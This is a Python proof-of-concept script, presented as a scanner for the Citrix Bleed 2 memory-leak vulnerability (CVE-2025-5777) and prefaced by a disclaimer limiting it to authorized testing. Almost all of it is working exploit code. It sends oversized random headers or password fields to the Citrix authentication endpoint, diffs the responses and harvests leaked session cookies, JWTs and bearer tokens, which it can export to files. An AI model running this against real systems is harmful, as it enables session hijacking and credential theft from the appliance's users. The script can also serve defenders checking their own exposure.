# LEGAL DISCLAIMER
# This script is provided for educational and authorized security testing purposes only.
# By using this script, you agree that you will only use it on systems for which you have explicit, written permission to test.
# The author and contributors are not responsible for any misuse or damage caused by this script.
# Unauthorized scanning of systems is illegal and strictly prohibited.

import argparse
import json
import re
import time
import warnings
from urllib.parse import urljoin
import requests
from requests.exceptions import RequestException
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from math import log2
import random
import string

warnings.simplefilter("ignore", InsecureRequestWarning)

# --- Fingerprint Engine ---
# These constants and functions are used to identify and extract sensitive information from the HTTP responses.
TAG_OPEN = b"<InitialValue>"
TAG_CLOSE = b"</InitialValue>"
EXTRACT_RE = re.compile(
    re.escape(TAG_OPEN) + b"(.*?)" + re.escape(TAG_CLOSE),
    flags=re.DOTALL | re.IGNORECASE,
)

def estimate_entropy(s: bytes or str) -> float:
    """
    Estimates the Shannon entropy of a string to identify randomness, which can indicate a token or key.
    A higher entropy value suggests more randomness.
    """
    if not s or len(s) < 8:
        return 0
    # Ensure string is in a consistent format for analysis
    s = s.decode('utf-8', errors='ignore') if isinstance(s, bytes) else s
    
    # Calculate probability of each character
    probs = [s.count(c) / len(s) for c in set(s)]
    
    # Calculate Shannon entropy
    entropy = -sum(p * log2(p) for p in probs)
    return round(entropy, 2)

def extract_initial_value(blob: bytes) -> bytes | None:
    """
    Searches for and extracts the content between <InitialValue> and </InitialValue> tags.
    This is a strong indicator of a memory leak from the Citrix ADC device.
    Returns the extracted content as bytes, or None if not found.
    """
    m = EXTRACT_RE.search(blob)
    return None if m is None else m.group(1)

def extract_tokens(text: str) -> list:
    """
    Extracts potential session tokens, JWTs, and other sensitive information from text using regex patterns.
    It filters out common, non-sensitive strings and focuses on high-entropy values.
    """
    # Patterns for common token formats
    patterns = {
        "NSC_Cookie": r"NSC_TMAA=[a-zA-Z0-9+/=]+",
        "JWT": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
        "Bearer": r"Bearer\s+[A-Za-z0-9\-_.=]{20,}",
    }
    
    # List of strings to ignore to reduce false positives
    ignore_list = ["/netscaler/ns_gui/ns_images/ns_logo_new.png", "text/html", "charset=utf-8"]

    findings = []
    for token_type, pattern in patterns.items():
        matches = re.findall(pattern, text)
        for match in matches:
            # Skip if the match contains any of the ignored strings
            if any(ignored in match for ignored in ignore_list):
                continue
            
            # Calculate entropy to gauge randomness
            entropy = estimate_entropy(match)
            # High entropy is a good indicator of a valid token
            if entropy > 4.5:
                findings.append({"type": token_type, "value": match, "entropy": entropy})
    return findings

def display_findings(findings: list):
    """Prints the discovered tokens and their details in a formatted way."""
    if not findings:
        return
    print("\n[+] High-Confidence Tokens Found:")
    print("-" * 60)
    for f in findings:
        print(f"  - Type: {f['type']}")
        # Display only the first 80 characters of the token to keep the output clean
        print(f"    Value: {f['value'][:80]}...")
        print(f"    Entropy: {f['entropy']:.2f}")
        print("-" * 60)

# --- Payload Generation ---
def prepare_payload(method: str) -> (dict, str):
    """
    Prepares the HTTP headers and data for the request based on the chosen test method.
    This is designed to trigger the memory leak by sending oversized requests.
    """
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    # Use a limited set of printable ASCII characters for the payload
    printable_ascii = string.printable.replace("\n", "").replace("\r", "")
    
    data = "user=test&passwd=test" # Default data

    if method == "oversized-headers":
        # Create oversized headers to trigger the vulnerability
        headers["User-Agent"] = "".join(random.choices(printable_ascii, k=random.randint(8000, 9000)))
        headers["Cookie"] = "NSC_TEST=" + "".join(random.choices(printable_ascii, k=random.randint(8000, 9000)))
    elif method == "oversized-body":
        # Create an oversized request body
        password = "".join(random.choices(printable_ascii, k=random.randint(6000, 7000)))
        data = f"user=test&passwd={password}"
    else: # "randomized" method
        # Randomly choose between oversized headers or body for each request
        if random.choice([True, False]):
             headers["User-Agent"] = "".join(random.choices(printable_ascii, k=random.randint(8000, 9000)))
        else:
            password = "".join(random.choices(printable_ascii, k=random.randint(6000, 7000)))
            data = f"user=test&passwd={password}"
            
    return headers, data


# --- Differential Scanner ---
def diff_scan(normal_resp: str, mutated_resp: str) -> str:
    """
    Compares the baseline (normal) response with the response from a test request.
    It identifies and returns the lines that are unique to the test response, which may contain leaked data.
    """
    normal_lines = set(normal_resp.splitlines())
    mutated_lines = set(mutated_resp.splitlines())
    # Find lines present in the mutated response but not in the normal one
    diff = mutated_lines - normal_lines
    return "\n".join(diff)

# --- Request Logic ---
def send_request(target: str, method: str, headers: dict, data: str, insecure: bool) -> requests.Response | None:
    """
    Sends a single HTTP POST request to the target URL and handles potential connection errors.
    """
    try:
        response = requests.request(
            "POST", target, headers=headers, data=data, verify=not insecure, timeout=15
        )
        return response
    except RequestException as e:
        print(f"[-] Connection error: {e}")
        return None

# --- CLI Handler ---
def main():
    """
    Main function to parse command-line arguments and orchestrate the scanning process.
    """
    parser = argparse.ArgumentParser(
        description="Citrix Bleed 2 PoC Scanner (CVE-2025-5777)",
        epilog="**WARNING: For authorized testing only. Do not use on systems you do not own.**",
    )
    # --- Argument parsing ---
    parser.add_argument("--target", required=True, help="Target URL (e.g., https://192.168.1.100)")
    parser.add_argument("--loop", type=int, default=1, help="Number of requests to send (default: 1)")
    parser.add_argument("--delay", type=float, default=2.0, help="Delay between requests in seconds (default: 2.0)")
    parser.add_argument("--test-method", default="randomized", choices=["randomized", "oversized-headers", "oversized-body"], help="The testing method to use (default: randomized).")
    parser.add_argument("--json-out", help="Export found tokens to a JSON file")
    parser.add_argument("--csv-out", help="Export found tokens to a CSV file")
    parser.add_argument("--raw-out", help="Export raw response content to a file for manual analysis")
    parser.add_argument(
        "--no-insecure",
        action="store_false",
        dest="insecure",
        help="Enable TLS certificate verification (default: disabled)",
    )
    parser.set_defaults(insecure=True)

    args = parser.parse_args()

    # --- Target setup ---
    target = args.target
    # Ensure the target URL has a scheme
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    # The specific endpoint vulnerable to Citrix Bleed
    target_url = urljoin(target, "/nf/auth/doAuthentication.do")

    print(f"[*] Target: {target_url}")
    print(f"[*] Test Method: {args.test_method}")
    print(f"[*] Loop: {args.loop} requests with {args.delay}s delay")
    print("-" * 50)

    # --- Baseline Request ---
    # Send a normal request to get a baseline response for comparison.
    print("[*] Sending baseline request...")
    baseline_headers = {"User-Agent": "Mozilla/5.0"}
    baseline_data = "user=test&passwd=test"
    baseline_response = send_request(target_url, "POST", baseline_headers, baseline_data, args.insecure)
    if not baseline_response:
        print("[-] Failed to get a baseline response. Aborting.")
        return
    baseline_content = baseline_response.content
    print("[+] Baseline established.")

    all_found_tokens = []
    seen_tokens = set() # Keep track of unique tokens to avoid duplicates

    # --- Main scanning loop ---
    for i in range(args.loop):
        print(f"\n[*] Sending request {i + 1}/{args.loop}...")
        
        # Prepare a potentially malicious payload
        headers, data = prepare_payload(args.test_method)
        
        # Send the request
        response = send_request(target_url, "POST", headers, data, args.insecure)

        if response:
            print(f"[+] Response: {response.status_code} {response.reason}")
            
            # Save the raw response if requested
            if args.raw_out:
                with open(args.raw_out, "a") as f:
                    f.write(f"--- Response {i+1} ---\n{response.content.decode('utf-8', errors='ignore')}\n\n")
                print(f"[+] Appended raw response to {args.raw_out}")

            # --- Analysis ---
            # 1. Check for the high-confidence <InitialValue> tag
            initial_value = extract_initial_value(response.content)
            if initial_value:
                print("[!] Found <InitialValue> tag, this is a strong indicator of a leak!")
                token = {"type": "InitialValue", "value": initial_value.hex(), "entropy": estimate_entropy(initial_value)}
                if token['value'] not in seen_tokens:
                    display_findings([token])
                    all_found_tokens.append(token)
                    seen_tokens.add(token['value'])

            # 2. Perform differential analysis against the baseline
            diff_content = diff_scan(baseline_content.decode('utf-8', errors='ignore'), response.content.decode('utf-8', errors='ignore'))
            found_tokens = extract_tokens(diff_content)
            
            # Filter out tokens that have already been seen
            unique_tokens = [t for t in found_tokens if t['value'] not in seen_tokens]
            
            if unique_tokens:
                display_findings(unique_tokens)
                for t in unique_tokens:
                    all_found_tokens.append(t)
                    seen_tokens.add(t['value'])
            
            # If no new tokens are found, dump part of the response for manual inspection
            if not unique_tokens and not initial_value:
                print("[-] No new high-confidence tokens found in this response.")
                print("[*] Dumping first 3KB of raw response for manual analysis:")
                print(response.content[:3072].decode('utf-8', errors='ignore'))


        # Delay between requests to avoid overwhelming the server
        if args.loop > 1 and i < args.loop - 1:
            time.sleep(args.delay)

    print("-" * 50)
    print(f"[*] Scan complete. Total unique high-confidence tokens found: {len(all_found_tokens)}")

    # --- Exporting results ---
    if args.json_out and all_found_tokens:
        with open(args.json_out, "w") as f:
            json.dump(all_found_tokens, f, indent=4)
        print(f"[+] Exported tokens to {args.json_out}")

    if args.csv_out and all_found_tokens:
        with open(args.csv_out, "w") as f:
            f.write("type,entropy,value\n")
            for token in all_found_tokens:
                f.write(f"{token['type']},{token['entropy']},{token['value']}\n")
        print(f"[+] Exported tokens to {args.csv_out}")

if __name__ == "__main__":
    main()
